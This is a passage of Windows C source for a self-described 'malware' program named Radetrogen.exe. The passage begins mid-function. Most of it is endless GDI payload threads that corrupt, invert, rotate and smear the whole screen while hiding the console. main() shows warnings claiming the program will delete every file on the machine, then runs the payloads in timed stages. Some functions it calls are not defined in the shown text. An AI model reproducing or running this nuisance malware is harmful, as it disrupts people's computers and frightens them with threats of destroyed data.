	HDC hdc; // [esp+30h] [ebp-8h]

	v3 = alloca(16);
	hdc = GetDC(0);
	while (1)
	{
		cy = GetSystemMetrics(1);
		v5 = GetSystemMetrics(0);
		BitBlt(hdc, 0, 0, v5, cy, hdc, 0, 0, 0x330008u);
		Sleep(0x834u);
		v6 = GetSystemMetrics(1);
		v7 = GetSystemMetrics(0);
		BitBlt(hdc, 0, 0, v7, v6, hdc, 0, 0, 0x330008u);
		Sleep(0x834u);
	}
}
DWORD WINAPI h2(LPVOID)
{
	int v1; // ebx
	int v2; // eax
	int v3; // ebx
	int v4; // eax
	int v5; // eax
	HBRUSH h; // [rsp+50h] [rbp-30h]
	int cy; // [rsp+58h] [rbp-28h]
	int y; // [rsp+5Ch] [rbp-24h]
	int v9; // [rsp+60h] [rbp-20h]
	int w; // [rsp+64h] [rbp-1Ch]
	HDC hdc; // [rsp+68h] [rbp-18h]

	while (1)
	{
		hdc = GetDC(0i64);
		w = GetSystemMetrics(0);
		v9 = GetSystemMetrics(1);
		y = rand() % v9;
		cy = v9 - rand() % v9 + 109 - v9 / 2;
		v1 = (unsigned __int8)(rand() % 255);
		v2 = rand();
		v3 = v1 | ((unsigned __int8)(v2 - v2 / -255) << 8);
		v4 = rand();
		h = CreateSolidBrush(v3 | ((unsigned __int8)(v4 - v4 / -255) << 16));
		SelectObject(hdc, h);
		v5 = rand();
		BitBlt(hdc, 0, y, w, cy, hdc, v5 % 61 - 30, y, 0xCC0020u);
		PatBlt(hdc, 0, y, w, cy, 0x5A0049u);
		Sleep(0x32u);
		DeleteObject(h);
		DeleteDC(hdc);
	}
}
DWORD WINAPI h1(LPVOID)
{
	int y1; // ebx
	int v2; // eax
	int y; // [rsp+58h] [rbp-28h]
	int x; // [rsp+5Ch] [rbp-24h]
	int v5; // [rsp+60h] [rbp-20h]
	int v6; // [rsp+64h] [rbp-1Ch]
	HDC hdc; // [rsp+68h] [rbp-18h]

	while (1)
	{
		hdc = GetDC(0i64);
		v6 = GetSystemMetrics(0);
		v5 = GetSystemMetrics(1);
		x = rand() % v6;
		y = rand() % v5;
		y1 = rand() % 21 + y - 10;
		v2 = rand();
		BitBlt(hdc, x, y, 200, 200, hdc, v2 % 21 + x - 10, y1, 0xCC0020u);
		DeleteDC(hdc);
	}
}
DWORD WINAPI FIRST(LPVOID)
{
	int v4; // ebx
	int v5; // eax
	HBITMAP h; // [rsp+58h] [rbp-28h]
	HDC hdcSrc; // [rsp+60h] [rbp-20h]
	HDC hdc; // [rsp+68h] [rbp-18h]
	void* lpvBits; // [rsp+70h] [rbp-10h]
	int nHeight; // [rsp+78h] [rbp-8h]
	int nWidth; // [rsp+7Ch] [rbp-4h]
	DWORD v13; // [rsp+80h] [rbp+0h]
	int j; // [rsp+84h] [rbp+4h]
	int v15; // [rsp+88h] [rbp+8h]
	int i; // [rsp+8Ch] [rbp+Ch]
	v13 = GetTickCount();
	nWidth = GetSystemMetrics(0);
	nHeight = GetSystemMetrics(1);
	lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
	for (i = 0; ; i = (i + 1) % 3)
	{
		if (!i)
			RedrawWindow(0i64, 0i64, 0i64, 0x85u);
		hdc = GetDC(0i64);
		hdcSrc = CreateCompatibleDC(hdc);
		h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
		SelectObject(hdcSrc, h);
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0x830009u);
		GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		v15 = 0;
		if (GetTickCount() - v13 > 0xEA60)
			rand();
		for (j = 0; nHeight * nWidth > j; ++j)
		{
			if (!(j % nHeight) && !(rand() % 100))
				v15 = rand() % 50;
			*((BYTE*)lpvBits + 4 * j + v15) += 9;
		}
		SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		v4 = rand() % 3 - 1;
		v5 = rand();
		BitBlt(hdc, v5 % 3 - 1, v4, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
		DeleteObject(h);
		DeleteObject(hdcSrc);
		DeleteObject(hdc);
	}
}
DWORD WINAPI Squares2(LPVOID)
{
	HWND v3; // rax
	int v4; // ebx
	int v5; // eax
	int v6; // ebx
	int v7; // eax
	HBRUSH v8; // rax
	int y1; // ebx
	int v10; // eax
	int v11; // eax
	int y; // [rsp+58h] [rbp-28h]
	int x; // [rsp+5Ch] [rbp-24h]
	int v15; // [rsp+60h] [rbp-20h]
	int v16; // [rsp+64h] [rbp-1Ch]
	HDC hdc; // [rsp+68h] [rbp-18h]
	v3 = GetConsoleWindow();
	ShowWindow(v3, 0);
	GetDC(0i64);
	v16 = GetSystemMetrics(0);
	v15 = GetSystemMetrics(1);
	while (1)
	{
		hdc = GetDC(0i64);
		x = rand() % v16;
		y = rand() % v15;
		v4 = (unsigned __int8)(rand() % 255);
		v5 = rand();
		v6 = v4 | ((unsigned __int8)(v5 - v5 / -255) << 8);
		v7 = rand();
		v8 = CreateSolidBrush(v6 | ((unsigned __int8)(v7 - v7 / -255) << 16));
		SelectObject(hdc, v8);
		y1 = rand() % 21 + y - 10;
		v10 = rand();
		BitBlt(hdc, x, y, 200, 200, hdc, v10 % 21 + x - 10, y1, 0x5A0049u);
		v11 = rand();
		Sleep(10);
	}
}
DWORD WINAPI Squares3(LPVOID)
{
	int y1; // ebx
	int v4; // eax
	int v5; // eax
	int y; // [rsp+58h] [rbp-28h]
	int x; // [rsp+5Ch] [rbp-24h]
	int v9; // [rsp+60h] [rbp-20h]
	int v10; // [rsp+64h] [rbp-1Ch]
	HDC hdc; // [rsp+68h] [rbp-18h]
	GetDC(0i64);
	v10 = GetSystemMetrics(0);
	v9 = GetSystemMetrics(1);
	while (1)
	{
		hdc = GetDC(0i64);
		x = rand() % v10;
		y = rand() % v9;
		y1 = rand() % 21 + y - 10;
		v4 = rand();
		BitBlt(hdc, x, y, 200, 200, hdc, v4 % 21 + x - 10, y1, 0xEE0086u);
		v5 = rand();
		Sleep(1);
	}
}
DWORD WINAPI Dun2(LPVOID)
{
	HWND v3; // rax
	int v4; // eax
	int v5; // eax
	int v6; // eax
	int v7; // eax
	HBRUSH h; // [rsp+58h] [rbp-38h]
	HBRUSH ha; // [rsp+58h] [rbp-38h]
	HBRUSH hb; // [rsp+58h] [rbp-38h]
	HDC hdc; // [rsp+60h] [rbp-30h]
	int v13; // [rsp+6Ch] [rbp-24h]
	int cy; // [rsp+70h] [rbp-20h]
	int y; // [rsp+74h] [rbp-1Ch]
	int v16; // [rsp+7Ch] [rbp-14h]
	int v17; // [rsp+80h] [rbp-10h]
	int k; // [rsp+84h] [rbp-Ch]
	int j; // [rsp+88h] [rbp-8h]
	int i; // [rsp+8Ch] [rbp-4h]
	v3 = GetConsoleWindow();
	ShowWindow(v3, 0);
	v17 = GetSystemMetrics(0);
	v16 = GetSystemMetrics(1);
	for (i = 0; ; i = (i + 1) % 9)
	{
		if (!i)
			RedrawWindow(0i64, 0i64, 0i64, 0x85u);
		for (j = 0; rand() % 3 > j; ++j)
		{
			for (k = 0; rand() % 10 > k; ++k)
			{
				y = rand() % v17;
				cy = v16 - rand() % v16 + 58 - v16 / 2;
				v13 = rand() % 3;
				hdc = GetDC(0i64);
				if (!v13)
				{
					v4 = rand();
					h = CreateSolidBrush((unsigned __int8)(v4 % 100 - 101));
					SelectObject(hdc, h);
				}
				if (v13 == 1)
				{
					v5 = rand();
					ha = CreateSolidBrush((unsigned __int8)(v5 % 100 - 101) << 8);
					SelectObject(hdc, ha);
				}
				if (v13 == 2)
				{
					v6 = rand();
					hb = CreateSolidBrush((unsigned __int8)(v6 % 100 - 101) << 16);
					SelectObject(hdc, hb);
				}
				v7 = rand();
				BitBlt(hdc, 0, y, v17, cy, hdc, v7 % 40 - 30, y, 0xCC0020u);
			}
			rand();
			Sleep(0);
		}
	}
}
VOID WINAPI rotated()
{
	HWND v1; // rax
	POINT Point; // [rsp+50h] [rbp-40h] BYREF
	int v3; // [rsp+58h] [rbp-38h]
	int v4; // [rsp+5Ch] [rbp-34h]
	int v5; // [rsp+60h] [rbp-30h]
	int v6; // [rsp+64h] [rbp-2Ch]
	struct tagRECT Rect; // [rsp+70h] [rbp-20h] BYREF
	HDC hdcDest; // [rsp+88h] [rbp-8h]

	for (hdcDest = GetDC(0i64);
		;
		PlgBlt(
			hdcDest,
			&Point,
			hdcDest,
			Rect.left,
			Rect.top,
			Rect.right - Rect.left,
			Rect.top - Rect.bottom,
			0i64,
			0,
			0))
	{
		hdcDest = GetDC(0i64);
		v1 = GetDesktopWindow();
		GetWindowRect(v1, &Rect);
		Point.x = Rect.left + 10;
		Point.y = Rect.top - 10;
		v3 = Rect.right + 10;
		v4 = Rect.top + 10;
		v5 = Rect.left - 10;
		v6 = Rect.bottom - 10;
		PlgBlt(
			hdcDest,
			&Point,
			hdcDest,
			Rect.left,
			Rect.top,
			Rect.right - Rect.left,
			Rect.top - Rect.bottom,
			0i64,
			0,
			0);
	}
}
VOID WINAPI whiteness()
{
	int x; // [rsp+5Ch] [rbp-14h]
	int cy; // [rsp+60h] [rbp-10h]
	int v3; // [rsp+64h] [rbp-Ch]
	HDC hdc; // [rsp+68h] [rbp-8h]

	GetDC(0i64);
	v3 = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	while (1)
	{
		hdc = GetDC(0i64);
		x = rand() % v3;
		if ((rand() & 1) != 0)
		{
			if (rand() % 2 == 1)
				BitBlt(hdc, x, -1, -10, cy, hdc, x, 0, 0xEE0086u);
		}
		else
		{
			BitBlt(hdc, x, 1, 10, cy, hdc, x, 0, 0xEE0086u);
		}
	}
}void __stdcall moveq()
{
	int v1; // eax
	int v2; // eax
	int v3; // eax
	int v4; // eax
	int v5; // eax
	int v6; // eax
	int v7; // eax
	int v8; // eax
	int v9; // eax
	int v10; // eax
	int v11; // eax
	HBRUSH h; // [rsp+58h] [rbp-38h]
	HBRUSH ha; // [rsp+58h] [rbp-38h]
	HBRUSH hb; // [rsp+58h] [rbp-38h]
	HDC hdc; // [rsp+60h] [rbp-30h]
	int v16; // [rsp+6Ch] [rbp-24h]
	int cy; // [rsp+70h] [rbp-20h]
	int y; // [rsp+74h] [rbp-1Ch]
	int v19; // [rsp+7Ch] [rbp-14h]
	int v20; // [rsp+80h] [rbp-10h]
	int k; // [rsp+84h] [rbp-Ch]
	int j; // [rsp+88h] [rbp-8h]
	int i; // [rsp+8Ch] [rbp-4h]

	v20 = GetSystemMetrics(0);
	v19 = GetSystemMetrics(1);
	for (i = 0; ; i = (i + 1) % 9)
	{
		if (!i)
			RedrawWindow(0i64, 0i64, 0i64, 0x85u);
		for (j = 0; rand() % 3 > j; ++j)
		{
			for (k = 0; rand() % 10 > k; ++k)
			{
				y = rand() % v20;
				cy = v19 - rand() % v19 + 58 - v19 / 2;
				v16 = rand() % 3;
				hdc = GetDC(0i64);
				if (!v16)
				{
					v1 = rand();
					h = CreateSolidBrush((unsigned __int8)(v1 % 100 - 101));
					SelectObject(hdc, h);
				}
				if (v16 == 1)
				{
					v2 = rand();
					ha = CreateSolidBrush((unsigned __int8)(v2 % 100 - 101) << 8);
					SelectObject(hdc, ha);
				}
				if (v16 == 2)
				{
					v3 = rand();
					hb = CreateSolidBrush((unsigned __int8)(v3 % 100 - 101) << 16);
					SelectObject(hdc, hb);
				}
				v4 = rand();
				BitBlt(hdc, 0, y, v20, cy, hdc, v4 % 244 - 112, y, 0xCC0020u);
				v5 = rand();
				BitBlt(hdc, 0, y, v20, cy, hdc, v5 % 244 - 112, y, 0xCC0020u);
				v6 = rand();
				BitBlt(hdc, 0, y, v20, cy, hdc, v6 % 244 - 112, y, 0xCC0020u);
				v7 = rand();
				BitBlt(hdc, 0, y, v20, cy, hdc, v7 % 244 - 112, y, 0xCC0020u);
				v8 = rand();
				BitBlt(hdc, 0, y, v20, cy, hdc, v8 % 244 - 112, y, 0xCC0020u);
				v9 = rand();
				BitBlt(hdc, 0, y, v20, cy, hdc, v9 % 244 - 112, y, 0xCC0020u);
				v10 = rand();
				BitBlt(hdc, 0, y, v20, cy, hdc, v10 % 244 - 112, y, 0xCC0020u);
				v11 = rand();
				BitBlt(hdc, 0, y, v20, cy, hdc, v11 % 244 - 112, y, 0xCC0020u);
			}
			rand();
			Sleep(0);
		}
	}
}
DWORD WINAPI LAST(LPVOID)
{
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)moveq, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)rotated, 0i64, 0, 0i64);
	CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)whiteness, 0i64, 0, 0i64);
	Sleep(0xFFFFFFFF);
	return 0;
}
DWORD WINAPI Purple(LPVOID)
{
	void* v3; // rax
	int h; // [rsp+30h] [rbp-10h]
	int w; // [rsp+34h] [rbp-Ch]
	HDC hdc; // [rsp+38h] [rbp-8h]
	GetDC(0i64);
	w = GetSystemMetrics(0);
	for (h = GetSystemMetrics(1); ; PatBlt(hdc, 0, 0, w, h, PATINVERT))
	{
		hdc = GetDC(0i64);
		v3 = (void*)(65280);
		SelectObject(hdc, v3);
	}
}
DWORD WINAPI COLOR_RGB2(LPVOID)
{
	HWND v3; // rax
	HBITMAP h; // [rsp+58h] [rbp-38h]
	HDC hdcSrc; // [rsp+60h] [rbp-30h]
	HDC hdc; // [rsp+68h] [rbp-28h]
	void* lpvBits; // [rsp+70h] [rbp-20h]
	int nHeight; // [rsp+78h] [rbp-18h]
	int nWidth; // [rsp+7Ch] [rbp-14h]
	DWORD v12; // [rsp+80h] [rbp-10h]
	int j; // [rsp+84h] [rbp-Ch]
	int v14; // [rsp+88h] [rbp-8h]
	int i; // [rsp+8Ch] [rbp-4h]
	v3 = GetConsoleWindow();
	ShowWindow(v3, 0);
	v12 = GetTickCount();
	nWidth = GetSystemMetrics(0);
	nHeight = GetSystemMetrics(1);
	lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
	for (i = 0; ; i = (i + 1) % 2)
	{
		hdc = GetDC(0i64);
		hdcSrc = CreateCompatibleDC(hdc);
		h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
		SelectObject(hdcSrc, h);
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
		GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		v14 = 0;
		if (GetTickCount() - v12 > 0xA)
			rand();
		for (j = 0; nHeight * nWidth > j; ++j)
		{
			if (!(j % nHeight) && !(rand() % 110))
				v14 = rand() % 24;
			*((BYTE*)lpvBits + 4 * j + v14) -= 5;
		}
		SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
		DeleteObject(h);
		DeleteObject(hdcSrc);
		DeleteObject(hdc);
	}
}
__int64 Right1()
{
	HWND v0; // rax
	__int64 result; // rax
	POINT Point; // [rsp+50h] [rbp-50h] BYREF
	int v3; // [rsp+58h] [rbp-48h]
	int v4; // [rsp+5Ch] [rbp-44h]
	int v5; // [rsp+60h] [rbp-40h]
	int v6; // [rsp+64h] [rbp-3Ch]
	struct tagRECT Rect; // [rsp+70h] [rbp-30h] BYREF
	time_t v8; // [rsp+80h] [rbp-20h]
	__int64 v9; // [rsp+88h] [rbp-18h]
	int v10; // [rsp+94h] [rbp-Ch]
	HDC hdcDest; // [rsp+98h] [rbp-8h]

	hdcDest = GetDC(0i64);
	v10 = 10;
	v9 = 5i64;
	v8 = time(0i64);
	while (1)
	{
		result = time(0i64) - v8;
		if (result >= v9)
			break;
		v0 = GetDesktopWindow();
		GetWindowRect(v0, &Rect);
		Point.x = Rect.left - v10;
		Point.y = Rect.top + v10;
		v3 = Rect.right - v10;
		v4 = Rect.top - v10;
		v5 = Rect.left + v10;
		v6 = Rect.bottom + v10;
		PlgBlt(hdcDest, &Point, hdcDest, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
	}
	return 0;
}

__int64 Left1()
{
	HWND v0; // rax
	__int64 result; // rax
	POINT Point; // [rsp+50h] [rbp-50h] BYREF
	int v3; // [rsp+58h] [rbp-48h]
	int v4; // [rsp+5Ch] [rbp-44h]
	int v5; // [rsp+60h] [rbp-40h]
	int v6; // [rsp+64h] [rbp-3Ch]
	struct tagRECT Rect; // [rsp+70h] [rbp-30h] BYREF
	time_t v8; // [rsp+80h] [rbp-20h]
	__int64 v9; // [rsp+88h] [rbp-18h]
	int v10; // [rsp+94h] [rbp-Ch]
	HDC hdcDest; // [rsp+98h] [rbp-8h]

	hdcDest = GetDC(0i64);
	v10 = 10;
	v9 = 5i64;
	v8 = time(0i64);
	while (1)
	{
		result = time(0i64) - v8;
		if (result >= v9)
			break;
		v0 = GetDesktopWindow();
		GetWindowRect(v0, &Rect);
		Point.x = Rect.left + v10;
		Point.y = Rect.top - v10;
		v3 = Rect.right + v10;
		v4 = Rect.top + v10;
		v5 = Rect.left - v10;
		v6 = Rect.bottom - v10;
		PlgBlt(hdcDest, &Point, hdcDest, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
	}
	return 0;
}

__int64 w4()
{
	__int64 result; // rax
	int y; // [rsp+5Ch] [rbp-24h]
	int v2; // [rsp+60h] [rbp-20h]
	int v3; // [rsp+64h] [rbp-1Ch]
	time_t v4; // [rsp+68h] [rbp-18h]
	HDC hdc; // [rsp+78h] [rbp-8h]

	hdc = GetDC(0i64);
	v4 = time(0i64);
	while (1)
	{
		result = time(0i64) - v4;
		if (result >= 15)
			break;
		v3 = GetSystemMetrics(1);
		v2 = GetSystemMetrics(0);
		y = rand() % v3;
		rand();
		BitBlt(hdc, 0, y, v2, 15, hdc, 1, y, 0xCC0020u);
	}
	return 0;
}

__int64 w3()
{
	__int64 result; // rax
	int y; // [rsp+5Ch] [rbp-24h]
	int v2; // [rsp+60h] [rbp-20h]
	int v3; // [rsp+64h] [rbp-1Ch]
	time_t v4; // [rsp+68h] [rbp-18h]
	HDC hdc; // [rsp+78h] [rbp-8h]

	hdc = GetDC(0i64);
	v4 = time(0i64);
	while (1)
	{
		result = time(0i64) - v4;
		if (result >= 10)
			break;
		v3 = GetSystemMetrics(1);
		v2 = GetSystemMetrics(0);
		y = rand() % v3;
		rand();
		BitBlt(hdc, 0, y, v2, 15, hdc, 1, y, 0x8800C6u);
	}
	return 0;
}

__int64 w2()
{
	__int64 result; // rax
	int y; // [rsp+5Ch] [rbp-24h]
	int v2; // [rsp+60h] [rbp-20h]
	int v3; // [rsp+64h] [rbp-1Ch]
	time_t v4; // [rsp+68h] [rbp-18h]
	HDC hdc; // [rsp+78h] [rbp-8h]

	hdc = GetDC(0i64);
	v4 = time(0i64);
	while (1)
	{
		result = time(0i64) - v4;
		if (result >= 10)
			break;
		v3 = GetSystemMetrics(1);
		v2 = GetSystemMetrics(0);
		y = rand() % v3;
		rand();
		BitBlt(hdc, 0, y, v2, 15, hdc, 1, y, 0x660046u);
	}
	return 0;
}

__int64 w1()
{
	__int64 result; // rax
	int y; // [rsp+5Ch] [rbp-24h]
	int v2; // [rsp+60h] [rbp-20h]
	int v3; // [rsp+64h] [rbp-1Ch]
	time_t v4; // [rsp+68h] [rbp-18h]
	HDC hdc; // [rsp+78h] [rbp-8h]

	hdc = GetDC(0i64);
	v4 = time(0i64);
	while (1)
	{
		result = time(0i64) - v4;
		if (result >= 10)
			break;
		v3 = GetSystemMetrics(1);
		v2 = GetSystemMetrics(0);
		y = rand() % v3;
		rand();
		BitBlt(hdc, 0, y, v2, 15, hdc, 1, y, 0xEE0086u);
	}
	return 0;
}
void TaskDesk()
{
	int y1; // [rsp+5Ch] [rbp-14h]
	int v1; // [rsp+60h] [rbp-10h]
	int cy; // [rsp+64h] [rbp-Ch]
	HDC hdc; // [rsp+68h] [rbp-8h]

	hdc = GetDC(0i64);
	cy = GetSystemMetrics(1);
	v1 = GetSystemMetrics(0);
	y1 = rand() % cy;
	rand();
	BitBlt(hdc, 0, 0, v1, cy, hdc, 0, y1, 0x8800C6u);
	Sleep(0x1F4u);
}
VOID WINAPI killscreen(LPVOID lpThreadParameter)
{
	int v1; // [rsp+58h] [rbp-28h]
	int y; // [rsp+5Ch] [rbp-24h]
	int v3; // [rsp+60h] [rbp-20h]
	int v4; // [rsp+64h] [rbp-1Ch]
	time_t v5; // [rsp+68h] [rbp-18h]
	HDC hdc; // [rsp+78h] [rbp-8h]

	hdc = GetDC(0i64);
	v5 = time(0i64);
	while (time(0i64) - v5 < 120)
	{
		v4 = GetSystemMetrics(0);
		v3 = GetSystemMetrics(1);
		y = rand() % v3;
		v1 = rand() % 5;
		if (v1)
		{
			if (v1 == 1)
				BitBlt(hdc, 0, y, v4, 15, hdc, 1, y, 0xCC0020u);
		}
		else
		{
			BitBlt(hdc, 1, y, v4, 15, hdc, 0, y, 0xCC0020u);
		}
	}
	ExitThread(0);
}

DWORD WINAPI rotateDDD(LPVOID)
{
	__int64 v3; // rax
	time_t v5; // [rsp+38h] [rbp-38h]
	time_t v6; // [rsp+48h] [rbp-28h]
	HANDLE hObject; // [rsp+58h] [rbp-18h]
	time_t v8; // [rsp+60h] [rbp-10h]
	v8 = time(0i64);
	while (time(0i64) - v8 < 180)
	{
		w1();
		w2();
		w3();
		w4();
	}
	hObject = CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)killscreen, 0i64, 0, 0i64);
	v6 = time(0i64);
	while (time(0i64) - v6 < 120)
	{
		Left1();
		Right1();
	}
	CloseHandle(hObject);
	v5 = time(0i64);
	while (1)
	{
		v3 = time(0i64) - v5;
		if (v3 >= 120)
			break;
		TaskDesk();
	}
	return 0;
}
DWORD WINAPI payload1111(LPVOID lpParam)
{
	HWND desktop = GetDesktopWindow();
	RECT wRect;
	GetWindowRect(desktop, &wRect);
	POINT wPt[3];
	HDC hdc = GetDC(0);
	int ScrW = GetSystemMetrics(SM_CXSCREEN), ScrH = GetSystemMetrics(SM_CYSCREEN);
	int y = rand() % ScrH, h = ScrH - rand() % ScrH - (ScrH / 2 - 109);
	int w = wRect.right - wRect.left;
	int r = wRect.bottom - wRect.top;
	int x = GetSystemMetrics(0), p = GetSystemMetrics(1);

	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 21 + 11;
		wPt[0].y = wRect.top + 90 + 30;
		wPt[1].x = wRect.right - 69 - 420;
		wPt[1].y = wRect.top + 71 - 69;
		wPt[2].x = wRect.left + 54 + 34;
		wPt[2].y = wRect.bottom - 75 - 40;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 21 + 11;
		wPt[0].y = wRect.top + 15 - 30;
		wPt[1].x = wRect.right + 61 - 51;
		wPt[1].y = wRect.top - 31 - 49;
		wPt[2].x = wRect.left - 84 - 83;
		wPt[2].y = wRect.bottom - 75 - 50;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		y = rand() % ScrH, h = ScrH - rand() % ScrH - (ScrH / 2 - 109);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(hdc, 0, y, ScrW, h, PATINVERT);
		StretchBlt(hdc, 50, 50, w - 100, r - 100, hdc, 0, 0, w, r, SRCCOPY);
		BitBlt(hdc, rand() % (x - 0), rand() % (p - 0), rand() % (x - 0), rand() % (p - 0), hdc, rand() % (x - 0), rand() % (p - 0), SRCCOPY);
		PatBlt(hdc, 0, 0, x, y, PATINVERT);
	}
}
DWORD WINAPI payload2222(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 50 + 60;
		wPt[0].y = wRect.top + 70 + 30;
		wPt[1].x = wRect.right + 10 + 0;
		wPt[1].y = wRect.top + 50 + 65;
		wPt[2].x = wRect.left + 10 + 26;
		wPt[2].y = wRect.bottom + 80 + 99;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload3333(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 71 + 1;
		wPt[0].y = wRect.top + 12 + 30;
		wPt[1].x = wRect.right + 18 + 5;
		wPt[1].y = wRect.top + 71 + 16;
		wPt[2].x = wRect.left - 15 - 34;
		wPt[2].y = wRect.bottom - 62 - 10;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload4444(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 1 + 1;
		wPt[0].y = wRect.top + 7 + 6;
		wPt[1].x = wRect.right + 2 + 3;
		wPt[1].y = wRect.top + 5 + 9;
		wPt[2].x = wRect.left + 2 + 6;
		wPt[2].y = wRect.bottom + 0 + 3;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload5555(LPVOID lpParam)
{
	HWND desktop = GetDesktopWindow();
	HDC hdc = GetDC(0);
	RECT wRect;
	GetWindowRect(desktop, &wRect);
	int x = wRect.right - wRect.left;
	int y = wRect.bottom + wRect.top;
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);

	while (1)
	{
		SelectObject(hdc, CreateHatchBrush(rand() % 7, RGB(rand() % 255, rand() % 255, rand() % 255)));
		StretchBlt(hdc, rand() % 50, rand() % 50, x - 100, y - 100, hdc, 0, 0, x, y, SRCCOPY);
		BitBlt(hdc, rand() % 1, rand() % 1, sw, sh, hdc, rand() % 1, rand() % 1, 0x2837E28);
	}

}
DWORD WINAPI payload6666(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (1)
	{
		StretchBlt(desk, 1, 1, sw - 2, sh - 2, desk, 0, 0, sw, sh, SRCPAINT);
		Sleep(300);
	}
}
DWORD WINAPI payload8888(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (1)
	{
		StretchBlt(desk, 1, 1, sw - 2, sh - 2, desk, 0, 0, sw, sh, SRCAND);
		Sleep(300);
	}
}
int main() 
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"--- Русский язык \r\n \r\n Запустить данный вирус? Он удалит все файлы на вашей физической машине.\r\n \r\n ---English Language \r\n \r\nLaunch this malware? It will delete all files on your physical machine. ", L"Radetrogen.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else(999);
	{
		if (MessageBoxW(NULL, L"--- Русский язык \r\n \r\n Последняя попытка, если ты не согласен открыть вирус то можешь его закрыть через диспетчер задач! \r\n \r\nЛибо же физической машине конец. \r\n \r\n---English Language \r\n \r\n Last try, if you don’t agree to open the malware, you can close it through the task manager! \r\n \r\nOr the physical machine is finished.", L"Radetrogen.exe", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
Sleep(100);
HANDLE thread1 = CreateThread(0, 0, payload666, 0, 0, 0);
HANDLE thread1dot1 = CreateThread(0, 0, sub_4, 0, 0, 0);
HANDLE thread1dot2 = CreateThread(0, 0, curRand, 0, 0, 0);
sound4();
Sleep(30000);
TerminateThread(thread1, 0);
CloseHandle(thread1);
InvalidateRect(0, 0, 0);
HANDLE thread2 = CreateThread(0, 0, MoreTextouts, 0, 0, 0);
HANDLE thread2dot1 = CreateThread(0, 0, shake, 0, 0, 0);
HANDLE thread2dot2 = CreateThread(0, 0, Purple, 0, 0, 0);
sound1();
Sleep(30000);
TerminateThread(thread2, 0);
CloseHandle(thread2);
TerminateThread(thread2dot1, 0);
CloseHandle(thread2dot1);
TerminateThread(thread2dot2, 0);
CloseHandle(thread2dot2);
InvalidateRect(0, 0, 0);
Sleep(100);
HANDLE thread3 = CreateThread(0, 0, gomuse, 0, 0, 0);
HANDLE thread3dot1 = CreateThread(0, 0, MoreTextouts, 0, 0, 0);
HANDLE thread3dot2 = CreateThread(0, 0, drawEllipse, 0, 0, 0);
sound3();
Sleep(30000);
TerminateThread(thread3, 0);
CloseHandle(thread3);
TerminateThread(thread3dot1, 0);
CloseHandle(thread3dot1);
TerminateThread(thread3dot2, 0);
CloseHandle(thread3dot2);
InvalidateRect(0, 0, 0);
Sleep(100);
HANDLE thread4 = CreateThread(0, 0, shake, 0, 0, 0);
HANDLE thread4dot1 = CreateThread(0, 0, effect, 0, 0, 0);
HANDLE thread4dot2 = CreateThread(0, 0, drawEllipse, 0, 0, 0);
sound5();
Sleep(30000);
TerminateThread(thread4, 0);
CloseHandle(thread4);
TerminateThread(thread4dot1, 0);
CloseHandle(thread4dot1);
TerminateThread(thread4dot2, 0);
CloseHandle(thread4dot2);
InvalidateRect(0, 0, 0);
		
		}
	}
}